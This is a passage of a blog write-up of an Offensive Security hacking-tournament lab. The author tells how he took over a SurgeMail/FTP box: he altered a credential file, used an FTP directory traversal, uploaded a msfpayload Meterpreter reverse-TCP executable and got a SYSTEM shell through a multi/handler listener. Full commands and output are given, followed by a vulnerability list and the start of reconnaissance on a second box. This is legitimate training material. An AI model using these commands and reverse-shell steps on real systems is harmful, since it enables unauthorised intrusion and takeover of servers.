+corelanc0d3r@killthen00b:{ssha}fqwU1VAdjf6TTr7Av3pUYDxHJ6Y8TQxt:
+n00b@killthen00b:{ssha}fqwU1VAdjf6TTr7Av3pUYDxHJ6Y8TQxt:
+devil@killthen00b:{ssha}fqwU1VAdjf6TTr7Av3pUYDxHJ6Y8TQxt:</pre>
+<p><em>(again, when I performed the exercise, this file was readable and
+ could be downloaded.&nbsp; It looks like muts and his friends got fed 
+up by people trying to change passwords and they finally blocked access 
+to this file) </em></p>
+<p>Anyways, I uploaded the modified nwauth.add file and tried to log in 
+to the domadmin (Domain Management) page using the “corelanc0d3r” and 
+password “admin” combination</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image32.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb32.png" alt="image" width="348" height="198" border="0"></a></p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/70_domadmin1.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="70_domadmin1" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/70_domadmin1_thumb.png" alt="70_domadmin1" width="497" height="311" border="0"></a></p>
+<p>Result :</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/71_domadmin2.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="71_domadmin2" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/71_domadmin2_thumb.png" alt="71_domadmin2" width="370" height="231" border="0"></a></p>
+<p>Nice.</p>
+<p>Let’s see if I can create some stuff here (just for fun). I decided to create a little blog and publish it on the server :</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/corelanc0d3r_blog.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="corelanc0d3r_blog" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/corelanc0d3r_blog_thumb.png" alt="corelanc0d3r_blog" width="477" height="298" border="0"></a></p>
+<p>muahaha…&nbsp;&nbsp; ok, enough playing.&nbsp;&nbsp; So I found a 
+second serious vulnerability on this box.&nbsp; But I should stay 
+focussed and try to 0wn the machine in order to grab the “secret key” 
+from the machine, which is what is really needed to complete this 
+challenge. Focus Peter, Focus.</p>
+<p>I went back to the surgemail home page and clicked on the “webmail” link.</p>
+<p>When looking at the WebMail login page, I noticed this :</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image14.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb14.png" alt="image" width="462" height="241" border="0"></a></p>
+<p>WebMail appears to be an executable, in the scripts folder.&nbsp; So 
+what if we can put our own executable in this “scripts” folder and call 
+it from the web browser ?</p>
+<p>First, using metasploit’s msfpayload, let’s create an evil executable
+ (Meterpreter reverse tcp shell) that would give us a nice shell :</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">./msfpayload windows/meterpreter/reverse_tcp RHOST=192.168.6.114 RPORT=4444 LHOST=192.168.6.114 LPORT=4444 X &gt; _corelanc0d3r.exe</pre>
+<p>I then uploaded the file to the scripts folder via the FTP directory traversal bug :</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">root@krypt2:/vpn/70# ftp 192.168.6.70
+Connected to 192.168.6.70.
+220-Complete FTP server
+220 FTP Server v 3.3.0
+Name (192.168.6.70:peter): devil
+331 Password required for devil
+Password:
+230 User devil logged in.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; cd \..\..\..\  
+250 Directory changed to "<span style="color: #7fec7f;">/MyDocuments/......</span>".
+ftp&gt; cd \..\..\..\
+250 Directory changed to "<span style="color: #7fec7f;">/MyDocuments/....../......</span>".
+ftp&gt; cd \..\..\..\
+250 Directory changed to "<span style="color: #7fec7f;">/MyDocuments/....../....../......</span>".
+ftp&gt; cd surgemail
+250 Directory changed to "<span style="color: #7fec7f;">/MyDocuments/....../....../....../surgemail</span>".
+ftp&gt; cd scripts
+250 Directory changed to "<span style="color: #7fec7f;">/MyDocuments/....../....../....../surgemail/scripts</span>".
+ftp&gt; bin
+200 Type set to I
+ftp&gt; put _corelanc0d3r.exe
+local: _corelanc0d3r.exe remote: _corelanc0d3r.exe
+200 PORT command successful.
+150 Opening BINARY mode <span style="color: #5576D1;">data</span> connection for _corelanc0d3r.exe
+226 Transfer complete.
+37888 bytes sent in 0.54 secs (69.1 kB/s)</pre>
+<p>Next, set up a metasploit multi handler and listen for incoming connections :</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">root@krypt2:/pentest/exploits/framework3# ./msfcli multi/handler 
+             payload=windows/meterpreter/reverse_tcp 
+             lhost=192.168.6.114 lport=4444 E
+[*] Please wait while we <span style="color: #5576D1;">load</span> the <span style="color: #5576D1;">module</span> tree...
+[*] Started reverse handler on port 4444
+[*] Starting the payload handler...</pre>
+<p>Finally I called the executable from the web browser :</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image15.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb15.png" alt="image" width="527" height="127" border="0"></a></p>
+<p>and the meterpreter session kicked in :</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">[*] Please wait while we <span style="color: #5576D1;">load</span> the <span style="color: #5576D1;">module</span> tree...
+[*] Started reverse handler on port 4444
+[*] Starting the payload handler...
+[*] Sending stage (725504 bytes)
+[*] Meterpreter session 1 opened (192.168.6.114:4444 -&gt; 192.168.6.70:49604)</pre>
+<p>w00t.&nbsp; Game over ? – Maybe…&nbsp; What are my privileges ?</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter &gt; ipconfig
+
+Software Loopback Interface 1
+Hardware MAC: 00:00:00:00:00:00
+IP Address  : 127.0.0.1
+Netmask     : 255.0.0.0
+
+
+
+Intel(R) PRO/1000 MT Network Connection
+Hardware MAC: 00:50:56:bc:1c:69
+IP Address  : 192.168.6.70
+Netmask     : 255.255.255.0
+
+
+meterpreter &gt; shell
+Process 3656 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+c:\surgemail\scripts&gt;</pre>
+<p>Yeah – game over. That’s good enough for me.&nbsp; Let’s see if we can find the file.</p>
+<blockquote><p>Usually, offsec will plant a “proof” .txt file on the 
+Desktop of the administrator of the machine.&nbsp; But since I already 
+had a shell, I decided to just list all txt files and see if I could see
+ a file that looks as if it’s a proof file.</p></blockquote>
+<p>I issued a “dir *.txt /S” and evaluated the output, and I found (as 
+expected) the proof file on the desktop of the administrator.</p>
+<p>I then used the shell to grab the secret file from the system :</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">c:\surgemail\scripts&gt;cd /
+cd /
+
+c:\&gt;cd users
+cd users
+
+c:\Users&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 0CDF-A146
+
+ Directory of c:\Users
+
+05/04/2010  12:10 AM    <dir>          .
+05/04/2010  12:10 AM    <dir>          ..
+05/03/2010  11:05 PM    <dir>          Administrator
+05/04/2010  12:06 AM    <dir>          devil
+05/04/2010  12:08 AM    <dir>          ftp
+07/13/2009  09:08 PM    <dir>          Public
+05/04/2010  12:10 AM    <dir>          TEMP
+               0 File(s)              0 bytes
+               7 Dir(s)   2,687,561,728 bytes free
+
+c:\Users&gt;cd Administrator
+cdcd Administrator
+
+c:\Users\Administrator&gt; Desktop
+cd Desktop
+
+c:\Users\Administrator\Desktop&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 0CDF-A146
+
+ Directory of c:\Users\Administrator\Desktop
+
+05/03/2010  11:59 PM    <dir>          .
+05/03/2010  11:59 PM    <dir>          ..
+05/03/2010  11:59 PM                32 proof.txt
+               1 File(s)             32 bytes
+               2 Dir(s)   2,687,496,192 bytes free
+
+c:\Users\Administrator\Desktop&gt;type proof.txt
+type proof.txt
+a61b0c1bf71267289efeecf778b1e51e
+c:\Users\Administrator\Desktop&gt;</dir></dir></dir></dir></dir></dir></dir></dir></dir></pre>
+<p>1:10 am. Game over. No need to look any further at this point. I even didn’t consider running a full nmap anymore.</p>
+<p>What else can be done here ?</p>
+<p>Basically,everything you want. Create admin user, rdp into the 
+machine, run hashdump, use this machine to pivot into other machines… 
+etc etc</p>
+<p>But I’m a good boy… I just went ahead and submitted the key …&nbsp; and earned another 25 points.</p>
+<p>&nbsp;</p>
+<h4>Conclusions :</h4>
+<p>I found a number of critical vulnerabilities on this machine.&nbsp; 
+Because of time constraints, as well as the fact that I already owned 
+the machine, I didn’t really look any further after I got hold of the 
+proof file</p>
+<p>So this list may be far from complete :</p>
+<ul>
+<li>FTP server is vulnerable to a directory traversal attack</li>
+<li>FTP server allows anonymous access (may not be a vulnerability by itself)</li>
+<li>insecure file permissions on the surgemail folder, allowing to download and upload files. This leads to
+<ul>
+<li>the ability to change the login credentials and gain
+<ul>
+<li>admin access to the surgemail system</li>
+<li>access to the mailbox of other users.&nbsp; I changed the password 
+of the “devil” account as well (set pw to “admin”), changed a parameter 
+in the webadmin.ini file, and I could read the mails from this 
+mailbox.&nbsp; The mailbox contained 3 log entries (surgemail server 
+restart notifications, with some interesting info)</li>
+<li>etc (use your imagination)</li>
+</ul>
+</li>
+<li>the ability to upload an evil executable into the “scripts” folder 
+and executing it in the context of the server, gaining full system 
+access (and allowing to grab the “proof.txt” file that contained the 
+secret key)</li>
+</ul>
+</li>
+<li>weak hash/cipher algo (SSL services allow the use of RC2, MD5, etc, which are considered to be weak)</li>
+<li>access to admin pages/webmail (= potentially sensitive 
+information)/etc webpages should be forced to use SSL. (While SSL access
+ was possible over port 7443, the default port (80) was not encrypted, 
+and that’s what most people might use. Just a simple redirect on port 
+80, forcing users to use SSL might do the job as well)</li>
+<li>Based on the contents of the avast.log file I found on the machine, surgemail may not be protected by avast antivirus<a href="https://www.corelan.be/wp-content/uploads/2010/05/image36.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb36.png" alt="image" width="396" height="109" border="0"></a></li>
+</ul>
+<blockquote><p>(In fact, I found a good amount of log files in the surgemail folder – unprotected and waiting to be altered after a comprimise)</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image251.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image251_thumb.png" alt="image" width="499" height="53" border="0"></a></p></blockquote>
+<ul>
+<li>Use valid certificates (instead of invalid self-signed certificate)<a href="https://www.corelan.be/wp-content/uploads/2010/05/image33.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb33.png" alt="image" width="303" height="53" border="0"></a></li>
+<li>insecure firewall configurations
+<ul>
+<li>too many ports open (more than needed to host services)</li>
+<li>allowing outbound traffic (reverse tunnel) when it’s not really necessary (allowing attacker to set up a reverse tunnel)</li>
+</ul>
+</li>
+<li>client facing services running with system privileges, increasing the impact when a vulnerability gets exploited :</li>
+</ul>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">meterpreter &gt; ps    
+
+Process list
+============
+
+ PID   Name                    Arch  User                          Path
+ ---   ----                    ----  ----                          ----
+ 0     [System Process]                                            
+ 4     System                  x86                                 
+ 260   smss.exe                x86   NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
+ 348   csrss.exe               x86   NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 392   wininit.exe             x86   NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
+ 480   services.exe            x86   NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
+ 488   lsass.exe               x86   NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
+ 500   lsm.exe                 x86   NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
+ 596   svchost.exe             x86   NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
+ 668   svchost.exe             x86   NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
+ 760   svchost.exe             x86   NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 816   svchost.exe             x86   NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 860   svchost.exe             x86   NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
+ 936   svchost.exe             x86   NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
+ 1048  svchost.exe             x86   NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
+ 1160  spoolsv.exe             x86   NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 1196  svchost.exe             x86   NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
+ 1364  CompleteFTPService.exe  x86   NT AUTHORITY\SYSTEM           C:\Program Files\Complete FTP\Server\CompleteFTPService.exe
+ 1664  surgemail.exe           x86   NT AUTHORITY\SYSTEM           c:\surgemail\surgemail.exe
+ 1828  swatch.exe              x86   NT AUTHORITY\SYSTEM           c:\surgemail\swatch.exe
+ 1884  nwauth.exe              x86   NT AUTHORITY\SYSTEM           c:\surgemail\nwauth.exe
+ 328   WmiPrvSE.exe            x86   NT AUTHORITY\SYSTEM           C:\Windows\system32\wbem\wmiprvse.exe
+ 1304  SearchIndexer.exe       x86   NT AUTHORITY\SYSTEM           C:\Windows\system32\SearchIndexer.exe
+ 2260  sppsvc.exe              x86   NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\sppsvc.exe
+ 2588  svchost.exe             x86   NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 3064  svchost.exe             x86   NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
+ 848   csrss.exe               x86   NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 748   winlogon.exe            x86   NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+ 784   LogonUI.exe             x86   NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
+ 3912  csrss.exe               x86   NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 3696  winlogon.exe            x86   NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+ 148   taskhost.exe            x86   killthen00b\Administrator     C:\Windows\system32\taskhost.exe
+ 1856  rdpclip.exe             x86   killthen00b\Administrator     C:\Windows\system32\rdpclip.exe
+ 3788  dwm.exe                 x86   killthen00b\Administrator     C:\Windows\system32\Dwm.exe
+ 3916  explorer.exe            x86   killthen00b\Administrator     C:\Windows\Explorer.EXE
+ 2000  jusched.exe             x86   killthen00b\Administrator     C:\Program Files\Common Files\Java\Java Update\jusched.exe
+ 3152  python.exe              x86   killthen00b\Administrator     C:\Python26\python.exe
+ 316   conhost.exe             x86   killthen00b\Administrator     C:\Windows\system32\conhost.exe
+ 884   WmiPrvSE.exe            x86   NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\wbem\wmiprvse.exe
+ 3568  _corelanc0d3r.exe       x86   NT AUTHORITY\SYSTEM           c:\surgemail\scripts\_corelanc0d3r.exe
+ 340   VSSVC.exe               x86   NT AUTHORITY\SYSTEM           C:\Windows\system32\vssvc.exe
+ 3968  svchost.exe             x86   NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 2116  TrustedInstaller.exe    x86   NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe</pre>
+<p>Anyways, there might be many more, but I went straight to the next challenge.</p>
+<p>(Based on <a title="http://www.exploit-db.com/exploits/5259" href="http://www.exploit-db.com/exploits/5259">http://www.exploit-db.com/exploits/5259</a>,
+ the IMAP service, for example, may be vulnerable to a post AUTH 
+bug.&nbsp; Since I have been able to change passwords for surgemail 
+accounts, it may have been possible to exploit this bug and use it to 
+gain system access again. But I didn’t try, because I already had 
+achieved the goal : get the key from the text file.</p>
+<blockquote><p>Note : the admin who set up this machine should either get trained, or fired. Does anyone know a decent training facility ?</p></blockquote>
+<p>&nbsp;</p>
+<h3>Challenge 2 : Ghost</h3>
+<p>This was a fun but painful/hard one. In addition to that (and 
+unfortunately for me), I had to spend most of the day (monday) in the 
+hospital…</p>
+<p>I was happy to see that my friends at Corelan Team continued their 
+evil work in the meantime.&nbsp; And it also was nice to see that they 
+applied the same logic and scripts/exploits that I was 
+using/trying.&nbsp; So they nailed the challenge before I could… and 
+that’s awesome.</p>
+<p>This is what I did to “bust Ghost” :</p>
+<p>A portscan against 192.168.6.66/67/68 revealed only one open port: tcp/80 (http), serving a webpage that looks like this :</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image68.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image68_thumb.png" alt="image" width="475" height="307" border="0"></a></p>
+<p>Apparently the person/people who set up this box, tried very hard (<em>not hard enough though</em>) to make it look like an MS IIS server :</p>
+<ul>
+<li>they changed the server header</li>
+<li>they planted well-known folder structures on the server which are available on some IIS servers</li>
+<li>they used asp file extension, which is usually linked to IIS (or Java Web Server)</li>
+</ul>
+<p>On top of that, they planted all kinds of “slow down”/fake exercises 
+(such as a nice script file called “javascript”, basically randomizing 
+the selection of pictures)), and used some nice redirection techniques 
+to make directory/file bruteforcing a real pain.</p>
+<p>But I quickly figured out that this is not a Windows box running IIS.
+ I did some folder bruteforcing and after filtering out some of the 
+redirects I found some interesting folders.&nbsp; One of the folders 
+displayed a basic folder browser (basically looking like something that 
+is served via IIS) : <a href="http://192.168.6.66/Sites">http://192.168.6.66/Sites</a></p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image17.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb17.png" alt="image" width="217" height="184" border="0"></a></p>
+<p>They even planted an file called “ViewCode.asp” on the server (size 
+0), probably in an attempt to slow down the attackers process and make 
+them focus on a known bug (but something that isn’t real)</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image18.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb18.png" alt="image" width="338" height="184" border="0"></a></p>
+<p>Nice try, but not good enough to convince me.</p>
+<p>On top of that, a quick xprobe also indicates that this is a linux box :</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;">root@krypt2:/pentest/enumeration# xprobe2 -v -p tcp:80:<span style="color: #5576D1;">open</span> 192.168.6.66
+
+Xprobe2 v.0.3 Copyright (c) 2002-2005 fyodor@o0o.nu, ofir@sys-security.com, meder@o0o.nu
+
+[+] Target is 192.168.6.66
+[+] Loading modules.
+[+] Following modules are loaded:
+[x] [1] ping:icmp_ping  -  ICMP echo discovery module
+[x] [2] ping:tcp_ping  -  TCP-based ping discovery module
+[x] [3] ping:udp_ping  -  UDP-based ping discovery module
+[x] [4] infogather:ttl_calc  -  TCP and UDP based TTL distance calculation
+[x] [5] infogather:portscan  -  TCP and UDP PortScanner
+[x] [6] fingerprint:icmp_echo  -  ICMP Echo request fingerprinting module
+[x] [7] fingerprint:icmp_tstamp  -  ICMP Timestamp request fingerprinting module
+[x] [8] fingerprint:icmp_amask  -  ICMP Address mask request fingerprinting module
+[x] [9] fingerprint:icmp_port_unreach  -  ICMP port unreachable fingerprinting module
+[x] [10] fingerprint:tcp_hshake  -  TCP Handshake fingerprinting module
+[x] [11] fingerprint:tcp_rst  -  TCP RST fingerprinting module
+[x] [12] fingerprint:smb  -  SMB fingerprinting module
+[x] [13] fingerprint:snmp  -  SNMPv2c fingerprinting module
+[+] 13 modules registered
+[+] Initializing scan engine
+[+] Running scan engine
+[-] ping:udp_ping module: <span style="color: #5576D1;">no</span> closed/<span style="color: #5576D1;">open</span> UDP ports known on 192.168.6.66. <span style="color: #5576D1;">Module</span> test failed
+[+] Host: 192.168.6.66 is up (Guess probability: 66%)
+[+] Target: 192.168.6.66 is alive. Round-Trip Time: 0.25938 sec
+[+] Selected safe Round-Trip Time <span style="color: #5576D1;">value</span> is: 0.51877 sec
+[-] fingerprint:smb need either TCP port 139 or 445 to run
+[-] fingerprint:snmp: need UDP port 161 <span style="color: #5576D1;">open</span>
+[+] Primary guess:
+[+] Host 192.168.6.66 Running OS: "<span style="color: #7fec7f;">Linux Kernel 2.4.10</span>" (Guess probability: 86%)
+[+] Other guesses:
+[+] Host 192.168.6.66 Running OS: "<span style="color: #7fec7f;">Linux Kernel 2.4.21</span>" (Guess probability: 86%)
+[+] Host 192.168.6.66 Running OS: "<span style="color: #7fec7f;">Linux Kernel 2.4.12</span>" (Guess probability: 86%)
+[+] Host 192.168.6.66 Running OS: "<span style="color: #7fec7f;">Linux Kernel 2.4.19</span>" (Guess probability: 86%)
+[+] Host 192.168.6.66 Running OS: "<span style="color: #7fec7f;">Linux Kernel 2.4.14</span>" (Guess probability: 86%)
+[+] Host 192.168.6.66 Running OS: "<span style="color: #7fec7f;">Linux Kernel 2.4.17</span>" (Guess probability: 86%)
+[+] Host 192.168.6.66 Running OS: "<span style="color: #7fec7f;">Linux Kernel 2.4.16</span>" (Guess probability: 86%)
+[+] Host 192.168.6.66 Running OS: "<span style="color: #7fec7f;">Linux Kernel 2.4.15</span>" (Guess probability: 86%)
+[+] Host 192.168.6.66 Running OS: "<span style="color: #7fec7f;">Linux Kernel 2.4.18</span>" (Guess probability: 86%)
+[+] Host 192.168.6.66 Running OS: "<span style="color: #7fec7f;">Linux Kernel 2.4.13</span>" (Guess probability: 86%)
+[+] Cleaning up scan engine
+[+] Modules deinitialized
+[+] Execution completed.</pre>
+<p>Taking this into account, this can only mean that the asp files are 
+either just static pages, or just renamed php files, served via a custom
+ handler.</p>
+<p>Looking at the other folders and files I discovered in the bruteforce, my attention was drawn by a file called /1/index.asp</p>
+<p>While requests to other pages seem to redirect to images or just return 200 OK, this page appeared to have some content.</p>
+<p>Look back at the login form on the first page… It seems to be just a 
+static html, renamed to an asp page, without any real code behind it. No
+ matter what you enter as username/password, you always end up on the 
+page again. So that either means that there’s code behind it that 
+doesn’t show anything, or that there is no code behind it. No way to 
+really tell at this point.</p>
+<p>But in the case the /1/index.asp page, things are different.</p>
+<p>If you enter a username and press the enter button, something 
+actually returns, so it looks like there is some code behind this page :</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image19.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb19.png" alt="image" width="462" height="159" border="0"></a></p>
+<p>Looking at the field names in the html source of the page, I see this :</p>
+<pre style="background-color: rgb(51, 51, 51); min-height: 40px; width: 600px; overflow: auto; border: 1px solid rgb(128, 128, 128); padding: 5px; font-family: monospace;"><span style="color: #5576D1;">&lt;</span><span style="color: #800000;">html</span><span style="color: #5576D1;">&gt;</span>
+<span style="color: #5576D1;">&lt;</span><span style="color: #800000;">head</span><span style="color: #5576D1;">&gt;</span>
+<span style="color: #5576D1;">&lt;</span><span style="color: #800000;">title</span><span style="color: #5576D1;">&gt;</span>Page title<span style="color: #5576D1;"><span style="color: #800000;">title</span><span style="color: #5576D1;">&gt;</span>
+<span style="color: #5576D1;"><span style="color: #800000;">head</span><span style="color: #5576D1;">&gt;</span>
+<span style="color: #5576D1;">&lt;</span><span style="color: #800000;">body</span><span style="color: #5576D1;">&gt;</span><span style="color: #5576D1;">&lt;</span><span style="color: #800000;">div</span> <span style="color: #ff0000;">align</span>=<span style="color: #5576D1;">"center"</span><span style="color: #5576D1;">&gt;</span>Wrong username or password.<span style="color: #5576D1;"><span style="color: #800000;">div</span><span style="color: #5576D1;">&gt;</span><span style="color: #d7df01;"></span>
+<span style="color: #5576D1;">&lt;</span><span style="color: #800000;">form</span> <span style="color: #ff0000;">method</span>=<span style="color: #5576D1;">"post"</span> <span style="color: #ff0000;">action</span>=<span style="color: #5576D1;">"/1/index.asp"</span><span style="color: #5576D1;">&gt;</span>
+Username: <span style="color: #5576D1;">&lt;</span><span style="color: #800000;">input</span> <span style="color: #ff0000;">type</span>=<span style="color: #5576D1;">"text"</span> <span style="color: #ff0000;">name</span>=<span style="color: #5576D1;">"slogin_POST_username"</span> <span style="color: #ff0000;">value</span>=<span style="color: #5576D1;">"corelanc0d3r"</span><span style="color: #5576D1;">&gt;</span><span style="color: #5576D1;">&lt;</span><span style="color: #800000;">br</span><span style="color: #5576D1;">&gt;</span>
+Password: <span style="color: #5576D1;">&lt;</span><span style="color: #800000;">input</span> <span style="color: #ff0000;">type</span>=<span style="color: #5576D1;">"password"</span> <span style="color: #ff0000;">name</span>=<span style="color: #5576D1;">"slogin_POST_password"</span><span style="color: #5576D1;">&gt;</span><span style="color: #5576D1;">&lt;</span><span style="color: #800000;">br</span><span style="color: #5576D1;">&gt;</span>
+<span style="color: #5576D1;">&lt;</span><span style="color: #800000;">input</span> <span style="color: #ff0000;">type</span>=<span style="color: #5576D1;">"submit"</span> <span style="color: #ff0000;">name</span>=<span style="color: #5576D1;">"slogin_POST_send"</span> <span style="color: #ff0000;">value</span>=<span style="color: #5576D1;">"Enter"</span><span style="color: #5576D1;">&gt;</span>
+<span style="color: #5576D1;"><span style="color: #800000;">form</span><span style="color: #5576D1;">&gt;</span>
+<span style="color: #5576D1;"><span style="color: #800000;">body</span><span style="color: #5576D1;">&gt;</span>
+<span style="color: #5576D1;"><span style="color: #800000;">html</span><span style="color: #5576D1;">&gt;</span></span></span></span></span></span></span></pre>
+<p>A quick Google search for the fieldnames (slogin_username or just 
+slogin_ in general) in this asp script provided me with a few resources :</p>
+<p><a title="http://www.dreamweaverclub.com/forum/showthread.php?t=24851" href="http://www.dreamweaverclub.com/forum/showthread.php?t=24851">http://www.dreamweaverclub.com/forum/showthread.php?t=24851</a></p>
+<p>=&gt; and that page leads me to :</p>
+<p><a href="http://www.mariovaldez.net/software/sitefilo/install.php">http://www.mariovaldez.net/software/sitefilo/install.php</a> (Simple Text-File Login script)</p>
+<p>which in return brings me at : <a title="http://www.milw0rm.com/exploits/7444" href="http://www.milw0rm.com/exploits/7444">http://www.milw0rm.com/exploits/7444</a></p>
+<p>In fact, <a title="http://192.168.6.66/1/version.txt" href="http://192.168.6.66/1/version.txt">http://192.168.6.66/1/version.txt</a> confirms that this might be the code that is installed on the system :</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image20.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb20.png" alt="image" width="282" height="262" border="0"></a></p>
+<p>Based on the milw0rm entry, it looks like this code may be vulnerable
+ to a RFI (Remote File Inclusion / Sensitive Data Disclosure bug)</p>
+<p>Let’s try the Data Disclosure bug first.&nbsp;&nbsp; The advisory 
+states that the default username/password file is called slog_users.txt.</p>
+<p>Unfortunately this file does not contain what we had expected :</p>
